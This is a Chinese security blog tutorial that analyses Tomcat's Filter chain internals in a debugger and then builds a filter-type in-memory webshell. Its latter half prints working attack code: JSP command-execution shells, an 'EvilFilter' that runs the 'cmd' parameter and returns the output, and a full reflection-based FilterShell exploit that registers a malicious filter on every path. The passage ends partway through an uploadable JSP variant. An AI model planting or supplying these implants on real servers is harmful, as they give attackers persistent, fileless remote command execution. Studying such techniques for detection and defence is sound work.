# Java内存马系列-03-Tomcat 之 Filter 型内存马

## 0x01 前言

学过 Servlet 的应该都知道 filter (过滤器)，我们可以通过自定义过滤器来做到对用户的一些请求进行拦截修改等操作，下面是一张简单的流程图

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/FilterServlet.png)

从上图可以看出，我们的请求会经过 filter 之后才会到 Servlet ，那么如果我们动态创建一个 filter 并且将其放在最前面，我们的 filter 就会最先执行，当我们在 filter 中添加恶意代码，就会进行命令执行，这样也就成为了一个内存 Webshell

所以我们后文的目标：**动态注册恶意 Filter，并且将其放到 最前面**

## 0x02 Tomcat Filter 流程分析

在学习 Filter 内存马的注入之前，我们先来分析一下正常 Filter 在 Tocat 中的流程是怎么样的。

### 项目搭建

- Maven 3.6.3
- Tomcat 8.5.81

首先在IDEA中创建Servlet，如不知道如何创建可以看我的另外一篇文章 [Servlet 项目搭建 | 芜风 (drun1baby.github.io)](https://drun1baby.github.io/2022/08/22/Servlet-项目搭建/)。

自定义 Filter

JAVA

```
import javax.servlet.*;  
import java.io.IOException;  
  
public class filter implements Filter{  
    @Override  
 public void init(FilterConfig filterConfig) throws ServletException {  
        System.out.println("Filter 初始构造完成");  
 }  
  
    @Override  
 public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {  
        System.out.println("执行了过滤操作");  
 filterChain.doFilter(servletRequest,servletResponse);  
 }  
  
    @Override  
 public void destroy() {  
  
    }  
}
```

然后修改 web.xml 文件，这里我们设置url-pattern为 `/filter` 即访问 `/filter` 才会触发

XML

```
<?xml version="1.0" encoding="UTF-8"?>  
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"  
 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  
 xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"  
 version="4.0">  
 <filter> <filter-name>filter</filter-name>  
 <filter-class>filter</filter-class>  
 </filter>  
 <filter-mapping> <filter-name>filter</filter-name>  
 <url-pattern>/filter</url-pattern>  
 </filter-mapping></web-app>
```

访问 url，触发成功。

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/FilterUsed.png)

接下来我们来分析一下 Tomcat 中是如何将我们自定义的 filter 进行设置并且调用的

哦对了，别忘了 pom.xml 里面加上 tomcat 的依赖库

XML

```
<dependencies>  
 <!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-catalina -->  
 <dependency>  
 <groupId>org.apache.tomcat</groupId>  
 <artifactId>tomcat-catalina</artifactId>  
 <version>8.5.81</version>  
 <scope>provided</scope>  
 </dependency></dependencies>
```

### 在访问 /filter 之后的流程分析

- 前情提要，有一些师傅的文章写的比较不清楚，看起来好像和调试没什么关系，其实只是因为有些师傅是分析 doFilter() 方法之前的东西，也有师傅是分析 doFilter() 方法之后的东西。

流程分析之前，需要像刚才导入 Servlet.jar 一样，导入 catalina.jar 这个包，以及 tomcat-websocket 包。

导入完毕之后，我们在 filter.java 下的 doFilter 这个地方打断点。并且访问 /filter 接口，至此，调试正式开始。

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/DebugPoint.png)

- 这里因为我们已经新建了一个 Filter，所以会直接进入到 doFilter 方法，我们跟进去。

这里会进到 `ApplicationFilterChain` 类的 doFilter() 方法，它主要是进行了 `Globals.IS_SECURITY_ENABLED`，也就是全局安全服务是否开启的判断。

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/ApplicationFilterChainDoFilter.png)

单步 f8 进去，直接走到了结尾，代码如下

JAVA

```
this.internalDoFilter(request, response);
```

我们继续跟进去，这里是 `ApplicationFilterChain` 类的 `internalDoFilter()` 方法

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/ApplicationFilterChainInternalDoFilter.png)

其中filter是从 `ApplicationFilterConfig filterConfig = filters[pos++]`;中来的，而filters的定义如下：

JAVA

```
private ApplicationFilterConfig[] filters = new ApplicationFilterConfig[0];
```

现在我们其实是有两个 filter 的，如图

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/TwoFilters.png)

可以看到，0 是我们自己设定的 filter，1 是 tomcat 自带的 filter，因为此时 pos 是 1 所以取到 tomcat 的 filter。

我们继续往里走，这里就调用了 tomcat 的 filter 的 doFilter() 方法

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/TomcatFilter.png)

再往下走，会走到 chain.doFilter() 这个地方，我们会发现这一个方法会回到 `ApplicationFilterChain` 类的 DoFilter() 方法里面

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/ApplicationFilterChainDoFilter.png)

- 这个地方实际需要理解一下，因为我们是一条 Filter 链，所以会一个个获取 Filter，直到最后一个。

那么现在我们只定义了一个 Filter，所以现在这次循环获取 Filter 链就是最后一次。

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/LastFilter.png)

在最后一次获取 Filter 链的时候，会走到 `this.servlet.service(request, response);` 这个地方

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/LastFilterServlet.png)

> 总的来说

最后一个 filter 调用 servlet 的 service 方法

上一个 Filter.doFilter() 方法中调用 FilterChain.doFilter() 方法将调用下一个 Filter.doFilter() 方法；这也就是我们的 Filter 链，是去逐个获取的。

最后一个 Filter.doFilter() 方法中调用的 FilterChain.doFilter() 方法将调用目标 Servlet.service() 方法。

只要 Filter 链中任意一个 Filter 没有调用 `FilterChain.doFilter()` 方法，则目标 `Servlet.service()` 方法都不会被执行。

**至此，我们的正向分析过程就结束了，得到的结论是 Filter Chain 的调用结构是一个个 doFilter() 的，最后一个 Filter 会调用 `Servlet.service()`**

### 在访问 /filter 之前的流程分析

分析目的在于：假设我们基于filter去实现一个内存马，我们需要找到filter是如何被创建的。

> 我们可以把断点下载最远的一处 invoke() 方法的地方

在 doFilter() 方法之前，一整个流程如图

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/ReDebug.png)

- 此处我们选到最远处的一个 invoke() 方法，如图。

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/FarestInvoke.png)

我们看到现在的类是 `StandardEngineValve`，对应的 Pipeline 就是 `EnginePipeline`；它进行了 invoke() 方法的调用，这个 invoke() 方法的调用的目的地是 `AbstractAccessLogValve` 类的 invoke() 方法。其实这一步已经安排了一个 `request, wrapper, servlet` 传递的顺序。

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/FirstInvoke.png)

接着是 `AbstractAccessLogValve` 类的 invoke() 方法，然后就是一步步调用 invoke() 方法。

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/SecondInvoke.png)

可以用这张图来表示这一整个过程。

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/InvokeChains.png)

至此，invoke() 部分的所有流程我们都分析完毕了，接着继续往上看，也就是 `doFilter()` 方法。这个 `doFilter()` 方法也是由最近的那个 invoke() 方法调用的。如图，我们把断点下过去。如果师傅们这个 invoke() 方法可用的话，可以断点下这里，如果不可用的话可以下到后面的 `doFilter()` 方法。

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/NearestInvoke.png)

这里我们要重点关注前文说过的 filterChain 这个变量，它是什么呢？

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/FilterChain.png)

我们跟进 createFilterChain() 这个方法。使用 `ApplicationFilterFactory.createFilterChain()` 创建了一个过滤链，将 `request, wrapper, servlet` 进行传递。

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/createFilterChain.png)

我们在 `createFilterChain()` 方法走一下流程。这里就是判断 FilterMaps 是否为空，若为空则会调用`context.findFilterMaps()`从`StandardContext`寻找并且返回一个FilterMap数组。

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/filterMaps.png)

再看后面的代码

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/findFilterConfig.png)

遍历`StandardContext.filterMaps`得到filter与URL的映射关系并通过`matchDispatcher()`、`matchFilterURL()`方法进行匹配，匹配成功后，还需判断`StandardContext.filterConfigs`中，是否存在对应filter的实例，当实例不为空时通过`addFilter`方法，将管理filter实例的`filterConfig`添加入`filterChain`对象中。

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/findFilterConfigJudge.png)

这时候我们再进入 `doFilter()` 的方法其实是，将请求交给其 pipeline 去处理，由 pipeline 中的所有 valve 顺序处理请求。后续的就是我们前文分析过的 **在访问 /filter 之后的流程分析**

### 小结一下分析流程

- 这一块我们可以把两个流程总结一下，总结完之后 Tomcat Filter 流程就变的比较简单。

#### 1. 首先是 invoke() 方法

层层调用管道，在最后一个管道的地方会创建一个链子，这个链子是 FilterChain，再对里头的 filter 进行一些相关的匹配。

#### 2. filterchain 拿出来之后

进行 `doFilter()` 工作，将请求交给对应的 pipeline 去处理，也就是进行一个 `doFilter()` —-> `internalDoFilter()` —-> `doFilter()`；直到最后一个 filter 被调用。

#### 3. 最后一个 filter

最后一个 filter 会执行完 `doFilter()` 操作，随后会跳转到 `Servlet.service()` 这里。至此，流程分析完毕。

#### 4. 小结一下攻击的思路

分析完了运行流程，那应该对应的也思考一下如何攻击。

我们的攻击代码，应该是生效于这一块的

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/findFilterConfigJudge.png)

我们只需要构造含有恶意的 filter 的 **filterConfig** 和拦截器 **filterMaps**，就可以达到触发目的了，并且它们都是从 StandardContext 中来的。

而这个 filterMaps 中的数据对应 web.xml 中的 filter-mapping 标签

XML

```
<?xml version="1.0" encoding="UTF-8"?>  
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"  
 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  
 xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"  
 version="4.0">  
 <filter> <filter-name>filter</filter-name>  
 <filter-class>filter</filter-class>  
 </filter>  
 <filter-mapping> <filter-name>filter</filter-name>  
 <url-pattern>/filter</url-pattern>  
 </filter-mapping></web-app>
```

> 所以后续的话，我们一定是思考通过某种方式去触发修改它的。

## 0x03 Filter 型内存马攻击思路分析

- 上文我们说到，我们一定是思考通过某种方式去触发修改 filterMaps 的，也就是如何修改 web.xml 中的 filter-mapping 标签。

filterMaps 可以通过如下两个方法添加数据，对应的类是 `StandardContext` 这个类

JAVA

```
@Override
public void addFilterMap(FilterMap filterMap) {
    validateFilterMap(filterMap);
    // Add this filter mapping to our registered set
    filterMaps.add(filterMap);
    fireContainerEvent("addFilterMap", filterMap);
}

@Override
public void addFilterMapBefore(FilterMap filterMap) {
    validateFilterMap(filterMap);
    // Add this filter mapping to our registered set
    filterMaps.addBefore(filterMap);
    fireContainerEvent("addFilterMap", filterMap);
}
```

`StandardContext` 这个类是一个容器类，它负责存储整个 Web 应用程序的数据和对象，并加载了 web.xml 中配置的多个 Servlet、Filter 对象以及它们的映射关系。

里面有三个和Filter有关的成员变量：

JAVA

```
filterMaps变量：包含所有过滤器的URL映射关系 

filterDefs变量：包含所有过滤器包括实例内部等变量 

filterConfigs变量：包含所有与过滤器对应的filterDef信息及过滤器实例，进行过滤器进行管理
```

filterConfigs 成员变量是一个HashMap对象，里面存储了filter名称与对应的`ApplicationFilterConfig`对象的键值对，在`ApplicationFilterConfig`对象中则存储了Filter实例以及该实例在web.xml中的注册信息。

filterDefs 成员变量成员变量是一个HashMap对象，存储了filter名称与相应`FilterDef`的对象的键值对，而`FilterDef`对象则存储了Filter包括名称、描述、类名、Filter实例在内等与filter自身相关的数据

filterMaps 中的`FilterMap`则记录了不同filter与`UrlPattern`的映射关系

JAVA

```
private HashMap<String, ApplicationFilterConfig> filterConfigs = new HashMap(); 

private HashMap<String, FilterDef> filterDefs = new HashMap(); 

private final StandardContext.ContextFilterMaps filterMaps = new StandardContext.ContextFilterMaps();
```

- 讲完了一些基础的概念，我们来看一看 ApplicationFilterConfig 里面存了什么东西

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/ApplicationFilterConfig.png)

它有三个重要的东西：
一个是ServletContext，一个是filter，一个是filterDef

- 其中filterDef就是对应web.xml中的filter标签了

XML

```
<filter>  
 <filter-name>filter</filter-name>  
 <filter-class>filter</filter-class>  
</filter>
```

从org.apache.catalina.core.StandardContext#filterStart中可以看到filterConfig可以通过filterConfigs.put(name, filterConfig);添加

JAVA

```
public boolean filterStart() {

        if (getLogger().isDebugEnabled()) {
            getLogger().debug("Starting filters");
        }
        // Instantiate and record a FilterConfig for each defined filter
        boolean ok = true;
        synchronized (filterConfigs) {
            filterConfigs.clear();
            for (Entry<String,FilterDef> entry : filterDefs.entrySet()) {
                String name = entry.getKey();
                if (getLogger().isDebugEnabled()) {
                    getLogger().debug(" Starting filter '" + name + "'");
                }
                try {
                    ApplicationFilterConfig filterConfig =
                            new ApplicationFilterConfig(this, entry.getValue());
                    filterConfigs.put(name, filterConfig);
                } catch (Throwable t) {
                    t = ExceptionUtils.unwrapInvocationTargetException(t);
                    ExceptionUtils.handleThrowable(t);
                    getLogger().error(sm.getString(
                            "standardContext.filterStart", name), t);
                    ok = false;
                }
            }
        }

        return ok;
    }
```

### 构造思路

通过前文分析，得出构造的主要思路如下
1、获取当前应用的ServletContext对象
2、通过ServletContext对象再获取filterConfigs
2、接着实现自定义想要注入的filter对象
4、然后为自定义对象的filter创建一个FilterDef
5、最后把 ServletContext对象、filter对象、FilterDef全部都设置到filterConfigs即可完成内存马的实现

## 0x04 Filter 型内存马的实现

我们先来看一下 JSP 的无回显的内存马：

JAVA

```
<% Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

是这样的，简单的命令执行，接着我们看有回显的木马

JAVA

```
<% if(request.getParameter("cmd")!=null){
    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    out.print("<pre>");
    while((a=in.read(b))!=-1){
        out.print(new String(b));
    }
    out.print("</pre>");
}
 
%>
```

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/MessageBackJSP.png)

那么现在，我们要把这个恶意的有回显的🐎插入到 Filter 里面进去，也就是说要配置一个恶意的 Filter，代码如图

JAVA

```
import javax.servlet.*;  
import javax.servlet.annotation.WebFilter;  
import javax.servlet.annotation.WebServlet;  
import javax.servlet.http.HttpServletRequest;  
import javax.servlet.http.HttpServletResponse;  
  
import java.io.IOException;  
import java.io.InputStream;  
import java.util.Scanner;  
  

public class EvilFilter implements Filter {  
    public void destroy() {  
    }  
  
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException {  
        HttpServletRequest req = (HttpServletRequest) request;  
 HttpServletResponse resp = (HttpServletResponse) response;  
 if (req.getParameter("cmd") != null) {  
            boolean isLinux = true;  
 String osTyp = System.getProperty("os.name");  
 if (osTyp != null && osTyp.toLowerCase().contains("win")) {  
                isLinux = false;  
 }  
            String[] cmds = isLinux ? new String[]{"sh", "-c", req.getParameter("cmd")} : new String[]{"cmd.exe", "/c", req.getParameter("cmd")};  
 InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();  
 Scanner s = new Scanner(in).useDelimiter("\\A");  
 String output = s.hasNext() ? s.next() : "";  
 resp.getWriter().write(output);  
 resp.getWriter().flush();  
 }  
        chain.doFilter(request, response);  
 }  
  
    public void init(FilterConfig config) throws ServletException {  
  
    }  
  
}
```

记得先把 web.xml 里面的类修改为 EvilFilter。并将 web.xml 的这一内容修改如下 `<url-pattern>/*</url-pattern>`

- 先跑一下测试一下，成功

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/SuccessTestJSPShell.png)

本质上其实就是 Filter 中接受执行参数，但是如果我们在现实情况中需要动态的将该 Filter 给添加进去。

由前面**Filter实例存储分析**得知 `StandardContext` Filter实例存放在filterConfigs、filterDefs、filterConfigs这三个变量里面，将fifter添加到这三个变量中即可将内存马打入。那么如何获取到`StandardContext` 成为了问题的关键。

我们一开始尝试通过这种方式获取，是会报错的

JAVA

```
WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();  

StandardRoot standardroot = (StandardRoot) webappClassLoaderBase.getResources();  

StandardContext standardContext = (StandardContext) standardroot.getContext();
```

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/Error500.png)

- 下面是可用的 EXP

### Filter 型内存马 EXP

我们这里尝试分步骤自己手写一下 EXP，构造思路在上面，这里就不赘述了，画一个流程图方便师傅们理解一下。

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/AttackRoute.png)

先是通过反射获取到 standContext

JAVA

```
ServletContext servletContext = request.getSession().getServletContext();  
  
 Field appctx = servletContext.getClass().getDeclaredField("context");  
 appctx.setAccessible(true);  
 ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);  
  
 Field stdctx = applicationContext.getClass().getDeclaredField("context");  
 stdctx.setAccessible(true);  
 StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);  
  
  
  
 String FilterName = "cmd_Filter";  
 Configs = standardContext.getClass().getDeclaredField("filterConfigs");  
 Configs.setAccessible(true);  
 filterConfigs = (Map) Configs.get(standardContext); 
```

- 接着，定义一个 Filter

JAVA

```
Filter filter = new Filter() {  
  
                    @Override  
 public void init(FilterConfig filterConfig) throws ServletException {  
  
                    }  
  
                    @Override  
 public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {  
                        HttpServletRequest req = (HttpServletRequest) servletRequest;  
 if (req.getParameter("cmd") != null){  
  
                            InputStream in = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();  
//  
 Scanner s = new Scanner(in).useDelimiter("\\A");  
 String output = s.hasNext() ? s.next() : "";  
 servletResponse.getWriter().write(output);  
  
 return; }  
                        filterChain.doFilter(servletRequest,servletResponse);  
 }  
  
                    @Override  
 public void destroy() {  
  
                    }  
                };
```

- 再设置 FilterDef 和 FilterMaps

JAVA

```
//反射获取 FilterDef，设置 filter 名等参数后，调用 addFilterDef 将 FilterDef 添加  
Class<?> FilterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");  
Constructor declaredConstructors = FilterDef.getDeclaredConstructor();  
FilterDef o = (FilterDef) declaredConstructors.newInstance();  
o.setFilter(filter);  
o.setFilterName(FilterName);  
o.setFilterClass(filter.getClass().getName());  
standardContext.addFilterDef(o);  
//反射获取 FilterMap 并且设置拦截路径，并调用 addFilterMapBefore 将 FilterMap 添加进去  
Class<?> FilterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");  
Constructor<?> declaredConstructor = FilterMap.getDeclaredConstructor();  
org.apache.tomcat.util.descriptor.web.FilterMap o1 = (FilterMap)declaredConstructor.newInstance();  
  
o1.addURLPattern("/*");  
o1.setFilterName(FilterName);  
o1.setDispatcher(DispatcherType.REQUEST.name());  
standardContext.addFilterMapBefore(o1);
```

最终将它们都添加到 filterConfig 里面，再放到 web.xml 里面

JAVA

```
Class<?> ApplicationFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");  
Constructor<?> declaredConstructor1 = ApplicationFilterConfig.getDeclaredConstructor(Context.class,FilterDef.class);  
declaredConstructor1.setAccessible(true);  
ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext,o);  
filterConfigs.put(FilterName,filterConfig);  
response.getWriter().write("Success");
```

> 完整的 EXP 如下所示

**FilterShell.java**

JAVA

```
import org.apache.catalina.Context;  
import org.apache.catalina.core.ApplicationContext;  
import org.apache.catalina.core.ApplicationFilterConfig;  
import org.apache.catalina.core.StandardContext;  
import org.apache.tomcat.util.descriptor.web.FilterDef;  
import org.apache.tomcat.util.descriptor.web.FilterMap;  
  
import javax.servlet.*;  
import javax.servlet.annotation.WebServlet;  
import javax.servlet.http.HttpServlet;  
import javax.servlet.http.HttpServletRequest;  
import javax.servlet.http.HttpServletResponse;  
import java.io.IOException;  
import java.io.InputStream;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.Field;  
  
import java.util.Map;  
import java.util.Scanner;  
  
@WebServlet("/demoServlet")  
public class FilterShell extends HttpServlet {  
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {  
  
  
//        org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();  
//        org.apache.catalina.webresources.StandardRoot standardroot = (org.apache.catalina.webresources.StandardRoot) webappClassLoaderBase.getResources();  
//        org.apache.catalina.core.StandardContext standardContext = (StandardContext) standardroot.getContext();  
//该获取StandardContext测试报错  
 Field Configs = null;  
 Map filterConfigs;  
 try {  
            //这里是反射获取ApplicationContext的context，也就是standardContext  
 ServletContext servletContext = request.getSession().getServletContext();  
  
 Field appctx = servletContext.getClass().getDeclaredField("context");  
 appctx.setAccessible(true);  
 ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);  
  
 Field stdctx = applicationContext.getClass().getDeclaredField("context");  
 stdctx.setAccessible(true);  
 StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);  
  
  
  
 String FilterName = "cmd_Filter";  
 Configs = standardContext.getClass().getDeclaredField("filterConfigs");  
 Configs.setAccessible(true);  
 filterConfigs = (Map) Configs.get(standardContext);  
  
 if (filterConfigs.get(FilterName) == null){  
                Filter filter = new Filter() {  
  
                    @Override  
 public void init(FilterConfig filterConfig) throws ServletException {  
  
                    }  
  
                    @Override  
 public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {  
                        HttpServletRequest req = (HttpServletRequest) servletRequest;  
 if (req.getParameter("cmd") != null){  
  
                            InputStream in = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();  
//  
 Scanner s = new Scanner(in).useDelimiter("\\A");  
 String output = s.hasNext() ? s.next() : "";  
 servletResponse.getWriter().write(output);  
  
 return; }  
                        filterChain.doFilter(servletRequest,servletResponse);  
 }  
  
                    @Override  
 public void destroy() {  
  
                    }  
                };  
 //反射获取FilterDef，设置filter名等参数后，调用addFilterDef将FilterDef添加  
 Class<?> FilterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");  
 Constructor declaredConstructors = FilterDef.getDeclaredConstructor();  
 FilterDef o = (FilterDef)declaredConstructors.newInstance();  
 o.setFilter(filter);  
 o.setFilterName(FilterName);  
 o.setFilterClass(filter.getClass().getName());  
 standardContext.addFilterDef(o);  
 //反射获取FilterMap并且设置拦截路径，并调用addFilterMapBefore将FilterMap添加进去  
 Class<?> FilterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");  
 Constructor<?> declaredConstructor = FilterMap.getDeclaredConstructor();  
 org.apache.tomcat.util.descriptor.web.FilterMap o1 = (FilterMap)declaredConstructor.newInstance();  
  
 o1.addURLPattern("/*");  
 o1.setFilterName(FilterName);  
 o1.setDispatcher(DispatcherType.REQUEST.name());  
 standardContext.addFilterMapBefore(o1);  
  
 //反射获取ApplicationFilterConfig，构造方法将 FilterDef传入后获取filterConfig后，将设置好的filterConfig添加进去  
 Class<?> ApplicationFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");  
 Constructor<?> declaredConstructor1 = ApplicationFilterConfig.getDeclaredConstructor(Context.class,FilterDef.class);  
 declaredConstructor1.setAccessible(true);  
 ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext,o);  
 filterConfigs.put(FilterName,filterConfig);  
 response.getWriter().write("Success");  
  
  
 }  
        } catch (Exception e) {  
            e.printStackTrace();  
 }  
  
  
    }  
  
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {  
        this.doPost(request, response);  
 }  
}
```

成功

![img](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/FinalSuccessEXP.png)

如果文件上传的话应该是上传一个 .jsp 文件

JAVA

```
<%--
  User: Drunkbaby
  Date: 2022/8/27
  Time: 上午10:31
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>

<%
    final String name = "Drunkbaby";
    // 获取上下文
    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
